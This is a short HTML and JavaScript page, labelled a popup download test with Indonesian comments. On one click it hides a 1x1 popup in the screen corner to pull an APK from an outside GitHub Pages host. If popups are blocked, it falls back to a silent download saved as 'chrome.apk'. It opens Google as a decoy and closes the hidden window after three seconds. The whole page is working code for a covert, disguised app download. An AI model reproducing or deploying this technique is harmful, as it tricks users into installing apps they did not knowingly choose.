<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Popup Download Test</title>
<style>
body { font-family:sans-serif;padding:20px;background:#f5f5f5 }
button { 
  padding:12px 18px;
  font-size:16px;
  background:#2196F3;
  color:white;
  border:none;
  border-radius:4px;
  cursor:pointer;
}
button:hover { background:#0b7dda }
pre { 
  background:#1a1a1a;
  color:#0f0;
  padding:15px;
  border-radius:4px;
  margin-top:15px;
  height:150px;
  overflow:auto;
}
</style>
</head>
<body>

<h3>Popup Test (Google + Auto Download)</h3>
<button id="btn">Buka Popup</button>
<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
const log = m => {
  logEl.textContent += `[${new Date().toLocaleTimeString()}] ${m}\n`;
  logEl.scrollTop = logEl.scrollHeight;
};

document.getElementById("btn").onclick = () => {
  log("User click diterima");
  
  // 1. Langsung buka popup dengan download terlebih dahulu
  // Buat popup untuk download
  const downloadPopup = window.open(
    'https://oxfat.github.io/fake.apk', 
    '_blank',
    `width=1,height=1,left=${screen.width-100},top=${screen.height-100}`
  );
  
  if (!downloadPopup) {
    log("❌ Popup download diblock!");
    // Fallback: download langsung
    const link = document.createElement('a');
    link.href = 'https://oxfat.github.io/fake.apk';
    link.download = 'chrome.apk';
    document.body.appendChild(link);
    link.click();
    setTimeout(() => document.body.removeChild(link), 100);
    log("✅ Coba download langsung");
  } else {
    log("✅ Popup download dibuka");
  }
  
  // 2. Buka Google.com di tab/popup baru
  setTimeout(() => {
    const googlePopup = window.open(
      'https://www.google.com',
      '_blank',
      `width=800,height=600,left=${(screen.width-800)/2},top=${(screen.height-600)/2}`
    );
    
    if (googlePopup) {
      log("✅ Google.com dibuka di popup baru");
    }
    
    // 3. Tutup popup download kecil setelah 3 detik
    setTimeout(() => {
      try {
        if (downloadPopup && !downloadPopup.closed) {
          downloadPopup.close();
          log("✅ Popup download ditutup");
        }
      } catch (e) {}
    }, 3000);
    
  }, 500);
};

// Deteksi jika download berhasil
window.addEventListener('blur', () => {
  setTimeout(() => {
    if (document.hasFocus()) {
      log("ℹ️ Popup download mungkin muncul");
    }
  }, 100);
});
</script>

</body>
</html>
